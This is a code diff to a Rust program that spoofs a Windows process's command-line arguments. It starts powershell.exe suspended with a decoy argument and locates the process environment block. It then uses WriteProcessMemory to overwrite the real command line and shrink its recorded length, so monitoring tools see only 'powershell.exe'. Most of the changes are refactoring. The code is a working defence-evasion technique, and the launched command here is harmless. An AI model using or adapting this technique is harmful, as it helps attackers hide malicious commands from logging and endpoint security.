@@ -1,6 +1,6 @@
 use std::{ffi::c_void, mem::size_of};
 use windows::{
-    core::{w, PWSTR},
+    core::{w, PWSTR, Result},
     Wdk::System::Threading::{NtQueryInformationProcess, ProcessBasicInformation},
     Win32::{
         Foundation::{CloseHandle, UNICODE_STRING}, 
@@ -16,6 +16,7 @@ use windows::{
     }
 };
 
+/// Calculates the byte offset of a field in a struct or union at compile time.
 macro_rules! offset_of {
     ($type:ty, $field:ident) => {{
         let base: *const $type = std::ptr::null();
@@ -24,16 +25,17 @@ macro_rules! offset_of {
     }};
 }
 
-fn main() -> Result<(), Box<dyn std::error::Error>> {
+fn main() -> Result<()> {
     unsafe {
-        // Creating a process in suspended mode
-        let mut start_argument = to_pwstr("powershell.exe args spoofing"); // Command that will perform spoofing
+        // Command that will perform spoofing
+        let mut start_argument = to_pwstr("powershell.exe args spoofing");
         let mut process_information = PROCESS_INFORMATION::default();
         let mut startup_info = STARTUPINFOW {
             cb: size_of::<STARTUPINFOW>() as u32,
             ..Default::default()
         };
 
+        // Creating a process in suspended mode
         CreateProcessW(
             None,
             PWSTR(start_argument.as_mut_ptr()),
@@ -90,20 +92,19 @@ fn main() -> Result<(), Box<dyn std::error::Error>> {
         let reajust_argument = to_pwstr("powershell.exe -NoExit notepad.exe");
         WriteProcessMemory(
             h_process,
-            user_process_params.CommandLine.Buffer.as_ptr() as _,
-            reajust_argument.as_ptr() as _,
+            user_process_params.CommandLine.Buffer.as_ptr().cast(),
+            reajust_argument.as_ptr().cast(),
             reajust_argument.len() * size_of::<u16>() + 1,
             None,
         )?;
 
         // Changing the size of CommandLine.Length
-        let new_len_power = "powershell.exe".encode_utf16().chain(Some(0)).count() * size_of::<u16>();
+        let new_len = "powershell.exe".encode_utf16().chain(Some(0)).count() * size_of::<u16>();
         let offset = peb.ProcessParameters as usize + offset_of!(RTL_USER_PROCESS_PARAMETERS, CommandLine) + offset_of!(UNICODE_STRING, Length);
-        
         WriteProcessMemory(
             h_process,
             offset as *const c_void,
-            &new_len_power as *const _ as *const c_void,
+            &new_len as *const _ as *const c_void,
             size_of::<u32>(),
             None,
         )?;
